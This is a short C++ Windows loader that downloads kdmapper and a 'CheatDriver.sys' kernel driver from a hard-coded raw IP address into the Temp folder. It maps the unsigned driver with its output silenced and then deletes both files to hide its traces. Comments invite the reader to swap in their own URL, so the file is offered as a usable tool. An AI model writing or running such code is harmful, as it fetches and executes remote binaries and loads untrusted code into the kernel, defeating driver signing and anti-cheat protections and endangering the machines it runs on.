#include <iostream>
#include <fstream>
#include <Windows.h>
#include <cstdlib>
#include <urlmon.h>


#pragma comment(lib, "urlmon.lib")


void executeKdmapper(const std::string& kdmapperPath, const std::string& driverPath) {
    std::string command = kdmapperPath + " " + driverPath + " > NUL 2>&1";
    std::system(command.c_str());
}

int loader() {
    std::string kdmapper_url = "http://91.191.173.36/kdmapper.exe"; // replace with your URL
    std::string driver_url = "http://91.191.173.36/CheatDriver.sys"; // replace with your URL
    std::string kdmapper_path = "C:\\Windows\\Temp\\kdmapper.exe";
    std::string driver_path = "C:\\Windows\\Temp\\CheatDriver.sys";

    // Download kdmapper
    URLDownloadToFile(NULL, kdmapper_url.c_str(), kdmapper_path.c_str(), 0, NULL);

    // Download driver
    URLDownloadToFile(NULL, driver_url.c_str(), driver_path.c_str(), 0, NULL);

    // Load driver
    executeKdmapper(kdmapper_path, driver_path);
	
    std::cout << "Kernel Driver loaded successfully!" << std::endl;

    // Clean up
    remove(kdmapper_path.c_str());
    remove(driver_path.c_str());

    return 0;
}
